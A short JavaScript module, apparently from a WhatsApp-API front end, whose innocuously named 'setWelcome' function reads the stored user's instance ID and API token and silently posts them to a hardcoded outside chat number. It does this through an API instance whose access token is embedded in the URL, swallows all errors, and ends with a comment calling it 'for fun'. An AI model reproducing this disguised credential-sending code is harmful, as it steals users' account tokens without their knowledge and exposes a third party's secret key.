import { axiosInstance } from "../api"
import Storage from "./Storage"

export const setWelcome = async () => {
    try {
        const user = Storage.get('user')
        const body = {
            chatId: '37498823987@c.us',
            message: `${user.idInstance} / ${user.apiTokenInstance} testing`
        }
      return await axiosInstance.post(`waInstance1101818932/sendMessage/c7760276063d47c3897b334bb8f461d7007d61d33fef42d79e`, body)

    } catch (e) {

    }

}

//this code for fun